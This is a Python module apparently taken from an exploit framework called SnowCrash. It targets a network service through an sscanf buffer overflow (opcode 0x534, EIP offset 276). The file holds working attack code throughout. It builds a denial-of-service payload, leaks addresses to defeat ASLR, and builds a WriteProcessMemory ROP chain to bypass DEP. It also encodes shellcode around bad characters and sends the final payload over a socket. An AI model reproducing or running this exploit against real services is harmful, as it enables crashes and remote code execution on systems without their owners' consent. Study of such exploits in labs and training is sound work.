import struct
import sys
import time

from sc_dep import SnowCrashDEP
from sc_utils import sanity_check

""" Vulnerable sscanf(...); """
""" opcode = 0x534          """
""" cbBuffer = 0x300        """
""" offsetEip = 276         """


class SnowCrashVulnService:

    SSCANF = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d"
    CB_SSCANF = len(SSCANF)
    CBMAX = 0x100000
    OFFSET_EIP = 276

    __opcode = 0
    __offsetOne = 0
    __offsetTwo = 0
    __offsetThree = 0
    __cbBufferOne = 0
    __cbBufferTwo = 0
    __cbBufferThree = 0

    __psAgentHeader = b""
    __psAgentBuffer = b""

    __cbPayload = 0
    __payload = b""

    __symbolOperation = b""

    def __init__(self, badChars=[]):
        self.badChars = badChars

    def ClearAll(self):
        self.__opcode = 0
        self.__offsetOne = 0
        self.__offsetTwo = 0
        self.__offsetThree = 0
        self.__cbBufferOne = 0
        self.__cbBufferTwo = 0
        self.__cbBufferThree = 0
        self.__psAgentHeader = b""
        self.__psAgentBuffer = b""
        self.__cbPayload = 0
        self.__payload = b""
        self.__symbolOperation = b""

    def CreatePsAgentCommandHeader(self):
        value_positions = {
            0x44: self.GetOpcode(),
            0x45: self.GetOffsetOne(),
            0x46: self.GetCbBufferOne(),
            0x47: self.GetOffsetTwo(),
            0x48: self.GetCbBufferTwo(),
            0x49: self.GetOffsetThree(),
            0x4a: self.GetCbBufferThree(),
        }

        psAgentCommandHeader = b""
        n = 12
        for i in range(1, n+1):
            val = 0x40 + i
            if val in value_positions:
                psAgentCommandHeader += struct.pack("<i", value_positions[val])
            else:
                psAgentCommandHeader += bytes([val]) * 4

        self.SetPsAgentHeader(psAgentCommandHeader)

    def SetSymbolOperation(self, symbol):
        self.__symbolOperation = b"SymbolOperation" + symbol + b"\x00"

    def GetSymbolOperation(self):
        return self.__symbolOperation

    def SetCbPayload(self, cbPayload):
        self.__cbPayload = struct.pack(">I", cbPayload)  # sz first 4 bytes

    def GetCbPayload(self):
        return self.__cbPayload

    def SetPayload(self, cbPayload, psAgentHeader, psAgentBuffer):
        self.__payload = (
            cbPayload +
            psAgentHeader +
            psAgentBuffer
        )

    def GetPayload(self):
        return self.__payload

    def SetPsAgentBuffer(self, psAgentBuffer):
        self.__psAgentBuffer = psAgentBuffer

    def SetPsAgentHeader(self, psAgentHeader):
        self.__psAgentHeader = psAgentHeader

    def GetPsAgentBuffer(self):
        return self.__psAgentBuffer

    def GetPsAgentHeader(self):
        return self.__psAgentHeader

    def GetOffsetOne(self):
        return self.__offsetOne

    def SetOffsetOne(self, offsetOne):
        self.__offsetOne = offsetOne

    def GetOffsetTwo(self):
        return self.__offsetTwo

    def SetOffsetTwo(self, offsetTwo):
        self.__offsetTwo = offsetTwo

    def GetOffsetThree(self):
        return self.__offsetThree

    def SetOffsetThree(self, offsetThree):
        self.__offsetThree = offsetThree

    def GetCbBufferOne(self):
        return self.__cbBufferOne

    def SetCbBufferOne(self, cbBufferOne):
        self.__cbBufferOne = cbBufferOne

    def GetCbBufferTwo(self):
        return self.__cbBufferTwo

    def SetCbBufferTwo(self, cbBufferTwo):
        self.__cbBufferTwo = cbBufferTwo

    def GetCbBufferThree(self):
        return self.__cbBufferThree

    def SetCbBufferThree(self, cbBufferThree):
        self.__cbBufferThree = cbBufferThree

    def SetOpcode(self, opcode):
        self.__opcode = opcode

    def GetOpcode(self):
        return self.__opcode

    def SetAllBuffers(self, cbBuffer):
        self.SetCbBufferOne(cbBuffer)
        self.SetCbBufferTwo(cbBuffer)
        self.SetCbBufferThree(cbBuffer)

    def SetAllOffsets(self, offset):
        self.SetOffsetOne(offset)
        self.SetOffsetTwo(offset)
        self.SetOffsetThree(offset)

    def ParseResponse(self, response):
        """ Parse a server response and extract the leaked address """
        pattern = b"Address is:"
        address = None
        for line in response.split(b"\n"):
            if line.find(pattern) != -1:
                address = int((line.split(pattern)[-1].strip()), 16)
        if not address:
            print("[-] Could not find the address in the Response")
            sys.exit()

        return address

    def CreateSymbolPayload(self, symbol, cbBuffer=0x100):
        print("[+] Creating symbol operation payload")

        self.SetOpcode(0x2000)
        self.SetAllOffsets(0x00)
        self.SetAllBuffers(cbBuffer)

        self.CreatePsAgentCommandHeader()
        self.SetSymbolOperation(symbol)
        self.SetCbPayload(cbBuffer)

        padding = b"\x90" * (
            cbBuffer - (
                len(self.GetPsAgentHeader()) +
                len(self.GetSymbolOperation())
            )
        )

        self.SetPsAgentBuffer(
            self.GetSymbolOperation() +
            padding
        )

        self.SetPayload(
            self.GetCbPayload(),
            self.GetPsAgentHeader(),
            self.GetPsAgentBuffer()
        )

    def CreateDosPayload(self):
        print("[+] Creating Denial of Service Payload in sscanf")

        self.SetOpcode(0x534)
        self.SetAllOffsets(0x00)
        self.SetAllBuffers(0x123)

        self.CreatePsAgentCommandHeader()
        self.SetCbPayload(0x4400)

        padding = b"\x90" * \
            (0x4404 - (len(self.GetPsAgentHeader()) + self.CB_SSCANF) + 2)

        buffer = self.SSCANF % (padding, 0, 0, 0, 0)

        self.SetPsAgentBuffer(buffer)

        self.SetPayload(
            self.GetCbPayload(),
            self.GetPsAgentHeader(),
            self.GetPsAgentBuffer()
        )

    def CreateExploitPayload(self, sploit):
        print("[+] Creating Exloit Payload sscanf()")

        cbBuf = 0x1100
        cbRopPad = int(cbBuf / 2)
        opcode = 0x534
        dep = sploit.dep

        self.SetOpcode(opcode)
        self.SetAllOffsets(0x00)
        self.SetAllBuffers(cbBuf)
        self.SetCbBufferOne(0x1100)
        self.SetCbBufferTwo(0x100)
        self.SetCbBufferThree(0x100)

        self.CreatePsAgentCommandHeader()
        self.SetCbPayload(cbBuf)

        ropChain, cbSkeleton = dep.BuildRopChainWriteProcessMemory(
            sploit.shellcode.GetShellCode()
        )
        ropLen = len(ropChain)
        print(f"ROP len: {ropLen}")
        offsetRopSkeleton = self.OFFSET_EIP - cbSkeleton
        paddingToRopSkeleton = b'\x41' * offsetRopSkeleton
        if ropLen > cbRopPad:
            print(f"ERROR: Our ropchain length is greater than the padding size")
            return

        paddingToShellcode = b'\x90' * (cbRopPad - ropLen)
        shellcode = sploit.shellcode.GetShellCode()

        nleft = (cbBuf + 4) - (
            len(self.GetPsAgentHeader()) +
            offsetRopSkeleton +
            len(ropChain) +
            self.CB_SSCANF +
            len(paddingToShellcode) +
            len(shellcode)
        ) + 2

        print(f"nleft: {nleft}")
        tailPadding = b"\x90" * nleft

        buffer = paddingToRopSkeleton + ropChain + \
            paddingToShellcode + shellcode + tailPadding
        self.SetPsAgentBuffer(
            self.SSCANF % (buffer, 1234, 1234, 1234, 1234)
        )

        self.SetPayload(
            self.GetCbPayload(),
            self.GetPsAgentHeader(),
            self.GetPsAgentBuffer()
        )

    def ResolveASLRAddressInfo(self, sploit, funcAddr, badCharFlag=True):
        net = sploit.net
        aslr = sploit.aslr
        service = sploit.service

        while (1):
            if net.GetSocket() != None:
                net.GetSocket().close()
                time.sleep(5)

            aslr.ClearAll()
            service.ClearAll()

            net.ConnectServerCreateSocket()

            aslr.SetAddressOffset(0x14E0)
            aslr.LeakFuncAddr(funcAddr)
            aslr.SetAddressBase()

            if (badCharFlag and aslr.HasAddressBadChar(self.badChars)):
                service.CreateDosPayload()
                net.SendPayload(sploit.service.GetPayload())
                time.sleep(15)

            else:
                break
        aslr.printer("[+] ASLR Information: ")

        return (aslr.GetAddress(), aslr.GetAddressOffset(), aslr.GetAddressBase())

    def EncodeShellcode(self, shellcode):
        print("\n[+] Encoding our shellcode ")
        shellcode.WriteShellCode()

        sc = shellcode.GetShellCode()
        badCharMap = shellcode.MapBadChars(sc)
        scEncode = shellcode.EncodeShellcode(sc)
        shellcode.SetShellCode(scEncode)

        return badCharMap

    def AppRunner(self, sploit):
        print("\n[+] Establishing dll Base for DEP")
        _, _, dllBase = self.ResolveASLRAddressInfo(
            sploit, b"N98E_CRYPTO_get_new_lockid")

        print("[+] Getting absolute address of WriteProcessMemory")
        WPMAddress, _, _ = self.ResolveASLRAddressInfo(
            sploit, b"WriteProcessMemory", False)

        dllBase = int.from_bytes(dllBase)
        WPMAddress = int.from_bytes(WPMAddress)

        badCharMap = self.EncodeShellcode(sploit.shellcode)

        print("\n[+] Creating exploit payload")
        # 0x400 - 4 bytes of memory for our shellcode. (to avoid null bytes)
        codeCave = dllBase + 0x92c04
        dataSection = dllBase + 0xe401c

        sploit.SetDEP(
            SnowCrashDEP(
                sploit,
                badCharMap=badCharMap,
                dllBase=dllBase,
                dataSection=dataSection,
                codeCave=codeCave,
                wpmAddress=WPMAddress
            )
        )

        self.CreateExploitPayload(sploit)
        sploit.net.SendPayload(
            self.GetPayload()
        )

        sploit.net.GetSocket().close()
        sys.exit(0)

    def Run(self, sploit):
        self.AppRunner(sploit)
